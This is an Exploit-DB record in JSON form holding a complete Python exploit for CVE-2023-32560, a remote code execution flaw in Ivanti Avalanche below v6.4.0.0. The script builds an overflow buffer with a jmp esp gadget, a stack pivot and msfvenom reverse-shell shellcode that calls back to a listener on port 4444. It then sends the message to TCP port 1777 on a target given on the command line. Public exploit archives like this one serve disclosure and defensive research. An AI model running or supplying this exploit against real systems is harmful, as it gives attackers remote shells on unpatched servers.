{"source": "https://www.exploit-db.com/exploits/51699", "vulnName": "Ivanti Avalanche <v6.4.0.0 - Remote Code Execution", "vulnEDBID": "51699", "vulnCVE": "2023-32560", "author": "ROBEL CAMPBELL", "exploitType": "REMOTE", "platform": "WINDOWS", "datePublished": "2023-09-04", "vulnContent": "\"\"\"\nExploit Title: Ivanti Avalanche <v6.4.0.0 - Remote Code Execution\nDate: 2023-08-16\nExploit Author: Robel Campbell (@RobelCampbell)\nVendor Homepage: https://www.ivanti.com/\nSoftware Link: https://www.wavelink.com/download/Downloads.aspx?DownloadFile=27550&returnUrl=/Download-Avalanche_Mobile-Device-Management-Software/\nVersion: v6.4.0.0\nTested on: Windows 11 21H2\nCVE: CVE-2023-32560\nReference: https://www.tenable.com/security/research/tra-2023-27\n\"\"\"\n\nimport socket\nimport struct\nimport sys\n\n# Create an item structure for the header and payload\nclass Item:\n    def __init__(self, type_, name, value):\n        self.type = type_\n        self.name = name.encode()\n        self.value = value\n        self.name_size = 0x5\n        self.value_size = 0x800\n\n    def pack(self):\n        return struct.pack('>III{}s{}s'.format(self.name_size, self.value_size),\n                           self.type, self.name_size, self.value_size, self.name, self.value)\n\n# Create a header structure\nclass HP:\n    def __init__(self, hdr, payload):\n        self.hdr = hdr\n        self.payload = payload\n        self.pad = b'\\x00' * (16 - (len(self.hdr) + len(self.payload)) % 16)\n\n    def pack(self):\n        return b''.join([item.pack() for item in self.hdr]) + \\\n               b''.join([item.pack() for item in self.payload]) + self.pad\n\n# Create a preamble structure\nclass Preamble:\n    def __init__(self, hp):\n        self.msg_size = len(hp.pack()) + 16\n        self.hdr_size = sum([len(item.pack()) for item in hp.hdr])\n        self.payload_size = sum([len(item.pack()) for item in hp.payload])\n        self.unk = 0  # Unknown value\n\n    def pack(self):\n        return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk)\n\n# Create a message structure\nclass Msg:\n    def __init__(self, hp):\n        self.pre = Preamble(hp)\n        self.hdrpay = hp\n\n    def pack(self):\n        return self.pre.pack() + self.hdrpay.pack()\n\n# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.30 LPORT=4444 exitfunc=thread -f python\nshellcode =  b\"\"\nshellcode += b\"fce8820000006089e531c064\"\nshellcode += b\"8b50308b520c8b52148b7228\"\nshellcode += b\"0fb74a2631ffac3c617c022c\"\nshellcode += b\"20c1cf0d01c7e2f252578b52\"\nshellcode += b\"108b4a3c8b4c1178e34801d1\"\nshellcode += b\"518b592001d38b4918e33a49\"\nshellcode += b\"8b348b01d631ffacc1cf0d01\"\nshellcode += b\"c738e075f6037df83b7d2475\"\nshellcode += b\"e4588b582401d3668b0c4b8b\"\nshellcode += b\"581c01d38b048b01d0894424\"\nshellcode += b\"245b5b61595a51ffe05f5f5a\"\nshellcode += b\"8b12eb8d5d68333200006877\"\nshellcode += b\"73325f54684c772607ffd5b8\"\nshellcode += b\"9001000029c454506829806b\"\nshellcode += b\"00ffd5505050504050405068\"\nshellcode += b\"ea0fdfe0ffd5976a0568c0a8\"\nshellcode += b\"561e680200115c89e66a1056\"\nshellcode += b\"576899a57461ffd585c0740c\"\nshellcode += b\"ff4e0875ec68f0b5a256ffd5\"\nshellcode += b\"68636d640089e357575731f6\"\nshellcode += b\"6a125956e2fd66c744243c01\"\nshellcode += b\"018d442410c6004454505656\"\nshellcode += b\"5646564e565653566879cc3f\"\nshellcode += b\"86ffd589e04e5646ff306808\"\nshellcode += b\"871d60ffd5bbe01d2a0a68a6\"\nshellcode += b\"95bd9dffd53c067c0a80fbe0\"\nshellcode += b\"7505bb4713726f6a0053ffd5\"\n\nbuf = b'90' * 340\nbuf += b'812b4100' # jmp esp (0x00412b81)\nbuf += b'90909090'\nbuf += b'90909090'\nbuf += shellcode\nbuf += b'41' * 80\nbuf += b'84d45200' # stack pivot: add esp, 0x00000FA0 ; retn 0x0004 ; (0x0052d484)\nbuf += b'43' * (0x800 - len(buf))\n\nbuf2 = b'41' * 0x1000\n\n# Create message payload\nhdr = [Item(3, \"pwned\", buf)]\npayload = [Item(3, \"pwned\", buf2)] # dummy payload, probabaly not necessary\nhp_instance = HP(hdr, payload)\nmsg_instance = Msg(hp_instance)\n\n# Default port\nport = 1777\n\n# check for target host argument\nif len(sys.argv) > 1:\n    host = sys.argv[1]\nelse:\n    print(\"Usage: python3 CVE-2023-32560.py <host ip>\")\n    sys.exit()\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.connect((host, port))\n    s.sendall(msg_instance.pack())\n    print(\"Message sent!\")\n    s.close()\n            "}